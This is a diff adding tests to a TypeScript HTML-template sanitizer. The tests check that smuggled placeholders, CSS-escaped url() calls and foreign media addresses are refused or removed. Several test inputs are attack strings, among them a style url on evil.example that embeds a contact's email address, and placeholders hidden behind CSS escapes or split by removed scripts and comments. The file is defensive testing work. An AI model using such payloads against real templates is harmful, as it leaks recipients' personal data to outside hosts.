@@ -22,10 +22,11 @@ const KEYS = [
 	'brand.primaryColor',
 	'brand.register',
 	'brand.website',
+	'contact.email',
 	'contact.firstName',
 ];
 const KIND: ImportKind = {
-	allowed: { keys: new Set(KEYS), known: new Set([...KEYS, 'content']) },
+	allowed: { keys: new Set(KEYS), known: new Set([...KEYS, 'contact.birthDate', 'content']) },
 	areaMediaIds: new Set([OWN]),
 	kind: 'template',
 };
@@ -317,5 +318,115 @@ describe('the schema of the sanitizer', () => {
 	])('drops %s on its own, without our cleaning pass', (html) => {
 		const tree = sanitize(fromHtml(html, { fragment: true }), SCHEMA);
 		expect(toHtml(tree)).not.toMatch(/href=|src=/u);
+	});
+});
+
+/**
+ * What an import came to: the refusals, or the cleaned HTML.
+ *
+ * @param result The result.
+ * @returns A text of either.
+ */
+function outcome(result: ReturnType<typeof importHtml>): string {
+	return result.ok ? result.html : JSON.stringify(result.refusals);
+}
+
+describe('placeholders that appear after the judgement', () => {
+	it.each([
+		[
+			'a forged token name in a url (B1)',
+			`<p>{{contact.email}}</p><p style='background:url(https://evil.example/vbph0x.png)'>x</p>`,
+		],
+		[
+			'a forged token name as CSS (B2)',
+			`<p>{{contact.firstName}}</p><p style='font-family:vbph0x'>x</p>`,
+		],
+		[
+			'a forged token name in a comment (B3)',
+			`<p title='{{brand.register | "--"}}'>x</p><!--[if mso]><style>.vbph0x>p{color:red}</style><![endif]-->`,
+		],
+		[
+			'a forged token name in a sheet (B4)',
+			`<p title='{{brand.register}}'>x</p><style>.vbph0x{color:red}</style>`,
+		],
+	])('are refused: %s', (_name, body) => {
+		expect(refusalsOf(run(body))).not.toStrictEqual([]);
+	});
+
+	it.each([
+		[
+			'a contact value in a CSS string (C1)',
+			`<p style='font-family:"\\7b\\7b contact.firstName\\7d\\7d"'>x</p>`,
+		],
+		[
+			'a contact value in a url (C2)',
+			`<p style='background:url(https://evil.example/\\7b\\7b contact.email\\7d\\7d.png)'>x</p>`,
+		],
+		['a forbidden key (C3)', `<p style='font-family:"\\7b\\7b contact.birthDate\\7d\\7d"'>x</p>`],
+		[
+			'a brand key in a sheet (C4)',
+			`<style>p{font-family:"\\7b\\7b brand.register\\7d\\7d"}</style>`,
+		],
+		[
+			'a brand key in a comment (C5)',
+			`<!--[if mso]><style>p{font-family:"\\7b\\7b brand.register | \\"--\\"\\7d\\7d"}</style><![endif]-->`,
+		],
+	])('written as a CSS escape are refused: %s', (_name, body) => {
+		expect(refusalsOf(run(body))).toStrictEqual([{ kind: 'placeholderHidden' }]);
+	});
+
+	it.each([
+		[
+			'in a comment (A11)',
+			`<!--[if mso]><p>{<script>x</script>{brand.register | "--"}}</p><![endif]-->`,
+		],
+		['across a removed comment (S1)', '<p>{<!-- x -->{contact.birthDate}}</p>'],
+		['across a removed element (S2)', '<p>{<svg></svg>{contact.birthDate | ""}}</p>'],
+		['across a removed script (A12)', '<p>{<script>x</script>{contact.birthDate}}</p>'],
+	])('joined by a removed node are refused: %s', (_name, body) => {
+		expect(refusalsOf(run(body))).toStrictEqual([{ kind: 'placeholderHidden' }]);
+	});
+
+	it('still takes real placeholders in CSS, once each', () => {
+		const html = `<p style='color:{{brand.primaryColor}}'>a</p><p style='color:{{brand.primaryColor}}'>b</p>`;
+		expect(run(html)).toMatchObject({ ok: true });
+	});
+});
+
+describe('url() written with an escape', () => {
+	it.each([
+		['http (D1)', `\\75 rl(http://evil.example/a.png)`],
+		['a foreign image (D2)', `\\75 rl(/media/${FOREIGN}.png)`],
+		['an upper-case data url (D3)', `\\55 RL(data:image/png;base64,AAAA)`],
+		['src', `src(http://evil.example/a.png)`],
+	])('is removed: %s', (_name, value) => {
+		expect(htmlOf(run(`<p style='background:${value}'>x</p>`))).not.toMatch(
+			/evil|FFFF|data:|rl\(|src\(/u,
+		);
+		expect(htmlOf(run(`<style>p{background:${value}}</style>`))).not.toMatch(
+			/evil|FFFF|data:|rl\(|src\(/u,
+		);
+	});
+});
+
+describe('addresses of the app', () => {
+	it.each([
+		`${ORIGIN}/media/${FOREIGN}.png#x`,
+		`${ORIGIN}/media/${FOREIGN}.png?x`,
+		`https://verein.example.org:443/media/${FOREIGN}.png`,
+		`${ORIGIN}/./media/${FOREIGN}.png`,
+		`${ORIGIN}//media/${FOREIGN}.png`,
+		`${ORIGIN}/%6Dedia/${FOREIGN}.png`,
+		`HTTPS://VEREIN.EXAMPLE.ORG/media/${FOREIGN}.png`,
+	])('are judged as the library, or dropped: %s', (src) => {
+		expect(outcome(run(`<img src="${src}" alt="">`))).not.toMatch(/src='https?:/u);
+		expect(outcome(run(`<p style='background:url(${src})'>x</p>`))).not.toMatch(/url\(https?:/u);
+	});
+
+	it('takes the library image of the area under such a form', () => {
+		expect(run(`<img src="${ORIGIN}/./media/${OWN}.png#x" alt="">`)).toMatchObject({
+			mediaIds: [OWN],
+			ok: true,
+		});
 	});
 });
